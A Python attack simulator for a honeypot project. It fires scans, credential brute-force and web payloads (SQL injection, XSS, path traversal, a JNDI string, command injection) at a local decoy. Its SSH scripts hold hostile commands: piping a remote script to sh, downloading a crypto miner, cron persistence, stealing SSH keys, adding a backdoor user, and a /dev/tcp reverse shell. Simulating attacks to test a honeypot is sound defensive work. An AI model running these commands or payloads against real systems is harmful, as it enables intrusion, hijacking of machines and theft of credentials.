#!/usr/bin/env python3
"""
Attack simulator (Member 7) - sends 100 realistic attacks to a running honeypot.

    python scripts/simulate_attacks.py              # 50 HTTP + 50 SSH attacks
    python scripts/simulate_attacks.py --fast       # no pauses between attacks
    python scripts/simulate_attacks.py --http-only  # or --ssh-only

Each attack is one connection, so afterwards the dashboard shows 100 new sessions:
  HTTP (50): 15 page/scanner probes, 10 login brute-force, 10 SQLi/XSS/RCE/LFI,
             15 WordPress / phpMyAdmin / secret-file scans
  SSH  (50): 25 brute-force logins with wrong passwords (rejected),
             15 logins with weak passwords + an interactive attack script,
             10 one-line commands ("ssh host 'cmd'") like bots send

Only run this against your own honeypot.
"""
import argparse
import random
import socket
import sys
import time
from datetime import datetime

import paramiko
import requests

HTTP_SCANS = [
    '/', '/login', '/admin', '/admin/login', '/robots.txt', '/index.php', '/server-status',
    '/backup.zip', '/api/v1/users', '/.well-known/security.txt', '/console', '/manager/html',
    '/cgi-bin/test.cgi', '/favicon.ico', '/dashboard',
]
HTTP_ATTACKS = [
    "/index.php?id=1' OR '1'='1",
    '/admin?id=1 UNION SELECT NULL,username,password FROM users',
    "/search?q=<script>alert('xss')</script>",
    '/search?q=<img src=x onerror=alert(1)>',
    '/../etc/passwd',
    '/page?file=../../../../etc/shadow',
    '/index.php?page=php://filter/convert.base64-encode/resource=index.php',
    '/ping?host=127.0.0.1;cat /etc/passwd',
    '/api?x=${jndi:ldap://203.0.113.5/a}',
    '/products?id=1 AND sleep(5)',
]
HTTP_PROBES = [
    '/wp-admin', '/wp-login.php', '/xmlrpc.php', '/wp-content/plugins/', '/wordpress/',
    '/phpmyadmin', '/phpMyAdmin/', '/pma/', '/myadmin/', '/.env', '/.git/config',
    '/config.php', '/.aws/credentials', '/db_backup.sql', '/.htpasswd',
]
WRONG_CREDENTIALS = [
    ('root', 'P@ssw0rd!'), ('admin', 'admin123'), ('root', ''), ('oracle', 'oracle123'),
    ('postgres', 'postgres1'), ('ftpuser', 'ftp'), ('support', 'support'), ('git', 'git'),
    ('root', 'qwerty'), ('admin', 'letmein'), ('test', '1234'), ('ubuntu', 'password1'),
]
WEAK_CREDENTIALS = [('root', 'root'), ('admin', 'admin'), ('root', '123456'), ('ubuntu', 'ubuntu'),
                    ('pi', 'raspberry'), ('root', 'toor'), ('test', 'test')]
ATTACK_SCRIPTS = [
    ['whoami', 'uname -a', 'cat /etc/passwd', 'exit'],
    ['id', 'cat /proc/cpuinfo | grep "model name" | head -1', 'free -m', 'nproc',
     'wget http://203.0.113.10/xmrig -O /tmp/xmrig', 'chmod +x /tmp/xmrig',
     '/tmp/xmrig -o stratum+tcp://pool.minexmr.com:4444 -u 44AFFq5k', 'exit'],
    ['uname -a', 'cd /tmp', 'curl -s http://203.0.113.11/bot.sh | sh',
     'echo "* * * * * /tmp/.bot" >> /var/spool/cron/crontabs/root', 'crontab -l', 'exit'],
    ['ls -la', 'cat .bash_history', 'cat ~/.ssh/id_rsa', 'grep -r password /var/www', 'history', 'exit'],
    ['ifconfig', 'cat /etc/hosts', 'ping -c 1 10.0.1.10', 'nmap -sS 10.0.1.0/24',
     'ssh root@10.0.1.10', 'exit'],
    ['sudo -l', 'sudo su', 'echo "ssh-rsa AAAAB3Nza attacker@kali" >> ~/.ssh/authorized_keys',
     'useradd -m backdoor', 'exit'],
    ['ps aux', 'netstat -tulpn', 'bash -i >& /dev/tcp/203.0.113.12/4444 0>&1', 'exit'],
]
EXEC_COMMANDS = [
    'uname -a', 'cat /proc/cpuinfo | grep name | wc -l', 'whoami; id', 'nproc',
    'cd /tmp && wget http://203.0.113.13/a.sh && sh a.sh',
    'echo -e "\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B"', 'free -m | grep Mem',
    'cat /etc/os-release', 'crontab -l', 'ls -la /tmp',
]
USER_AGENTS = ['Mozilla/5.0 zgrab/0.x', 'python-requests/2.31.0', 'Nikto/2.5.0', 'sqlmap/1.7.2#stable',
               'Mozilla/5.0 (compatible; Nmap Scripting Engine)', 'curl/7.81.0',
               'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0 Safari/537.36']


class Simulator:
    def __init__(self, http_target, ssh_host, ssh_port, fast=False):
        self.http_target = http_target.rstrip('/')
        self.ssh_host, self.ssh_port = ssh_host, ssh_port
        self.fast = fast
        self.sent = {'http': 0, 'ssh': 0}
        self.errors = 0

    def pause(self, low=0.1, high=0.4):
        if not self.fast:
            time.sleep(random.uniform(low, high))

    # -- HTTP ---------------------------------------------------------------
    def http(self, method, path, label, **kwargs):
        headers = {'User-Agent': random.choice(USER_AGENTS)}
        try:
            # A prepared request keeps "../" in the path (normal clients would remove it)
            session = requests.Session()
            req = requests.Request(method, self.http_target + path, headers=headers, **kwargs)
            prepared = session.prepare_request(req)
            prepared.url = self.http_target + path.replace(' ', '%20').replace('<', '%3C').replace('>', '%3E')
            response = session.send(prepared, timeout=5)
            print(f'  [{label}] {method:4} {path[:60]:60} -> {response.status_code}')
            self.sent['http'] += 1
        except requests.RequestException as exc:
            print(f'  [x] {method} {path}: {exc}')
            self.errors += 1
        self.pause()

    def run_http(self):
        print('\n=== HTTP decoy: 50 attacks ===')
        for path in HTTP_SCANS:
            self.http('GET', path, 'scan')
        for _ in range(10):
            user, password = random.choice(WRONG_CREDENTIALS + WEAK_CREDENTIALS)
            self.http('POST', '/login', 'login', data={'username': user, 'password': password})
        for path in HTTP_ATTACKS:
            self.http('GET', path, 'attack')
        for path in HTTP_PROBES:
            self.http('GET', path, 'probe')

    # -- SSH ----------------------------------------------------------------
    def ssh_connect(self, user, password):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(self.ssh_host, port=self.ssh_port, username=user, password=password, timeout=10,
                       banner_timeout=10, auth_timeout=10, look_for_keys=False, allow_agent=False)
        return client

    def ssh_bruteforce(self, user, password):
        try:
            client = self.ssh_connect(user, password)
            client.close()
            print(f'  [brute] {user}/{password or "(empty)"}: accepted')
        except paramiko.AuthenticationException:
            print(f'  [brute] {user}/{password or "(empty)"}: rejected')
        except (paramiko.SSHException, socket.error) as exc:
            print(f'  [x] brute-force {user}: {exc}')
            self.errors += 1
            return
        self.sent['ssh'] += 1

    def ssh_interactive(self, user, password, commands):
        try:
            client = self.ssh_connect(user, password)
            channel = client.invoke_shell()
            channel.settimeout(5)
            time.sleep(0.5)
            self._drain(channel)
            for command in commands:
                channel.send(command + '\r')
                time.sleep(0.3)
                self._drain(channel)
            client.close()
            print(f'  [shell] {user}/{password}: ran {len(commands)} commands '
                  f'({", ".join(c.split()[0] for c in commands[:4])}...)')
            self.sent['ssh'] += 1
        except Exception as exc:
            print(f'  [x] interactive session {user}: {exc}')
            self.errors += 1

    def ssh_exec(self, user, password, command):
        try:
            client = self.ssh_connect(user, password)
            _, stdout, _ = client.exec_command(command, timeout=5)
            output = stdout.read().decode('utf-8', 'ignore').strip().splitlines()
            client.close()
            print(f'  [exec ] {command[:50]:50} -> {output[0][:40] if output else "(no output)"}')
            self.sent['ssh'] += 1
        except Exception as exc:
            print(f'  [x] exec {command}: {exc}')
            self.errors += 1

    @staticmethod
    def _drain(channel):
        try:
            while channel.recv_ready():
                channel.recv(65535)
        except socket.timeout:
            pass

    def run_ssh(self):
        print('\n=== SSH decoy: 50 attacks ===')
        for _ in range(25):
            self.ssh_bruteforce(*random.choice(WRONG_CREDENTIALS))
            self.pause()
        for i in range(15):
            self.ssh_interactive(*random.choice(WEAK_CREDENTIALS), ATTACK_SCRIPTS[i % len(ATTACK_SCRIPTS)])
            self.pause()
        for command in EXEC_COMMANDS:
            self.ssh_exec(*random.choice(WEAK_CREDENTIALS), command)
            self.pause()


def main():
    parser = argparse.ArgumentParser(description='Send simulated attacks to your own honeypot')
    parser.add_argument('--http', default='http://127.0.0.1:8080', help='HTTP decoy URL')
    parser.add_argument('--ssh-host', default='127.0.0.1')
    parser.add_argument('--ssh-port', type=int, default=2222)
    parser.add_argument('--fast', action='store_true', help='no pauses between attacks')
    group = parser.add_mutually_exclusive_group()
    group.add_argument('--http-only', action='store_true')
    group.add_argument('--ssh-only', action='store_true')
    args = parser.parse_args()

    print('=' * 70)
    print('🧪 Network Honeypot - Attack Simulation')
    print(f'HTTP: {args.http}   SSH: {args.ssh_host}:{args.ssh_port}   {datetime.now():%Y-%m-%d %H:%M:%S}')
    print('=' * 70)

    sim = Simulator(args.http, args.ssh_host, args.ssh_port, fast=args.fast)
    if not args.ssh_only:
        try:   # plain TCP check, so it does not count as an extra session
            host_port = args.http.split('://', 1)[-1].split('/')[0]
            host, _, port = host_port.partition(':')
            socket.create_connection((host, int(port or 80)), timeout=3).close()
        except OSError:
            print(f'[x] HTTP decoy not reachable at {args.http}. Start it with: python -m app.main')
            return 1
        sim.run_http()
    if not args.http_only:
        sim.run_ssh()

    print('\n' + '=' * 70)
    print(f"Done: {sim.sent['http']} HTTP + {sim.sent['ssh']} SSH attacks sent, {sim.errors} errors")
    print('Open the dashboard: python -m app.dashboard.app  ->  http://127.0.0.1:5000')
    print('=' * 70)
    return 0 if sim.errors == 0 else 2


if __name__ == '__main__':
    sys.exit(main())
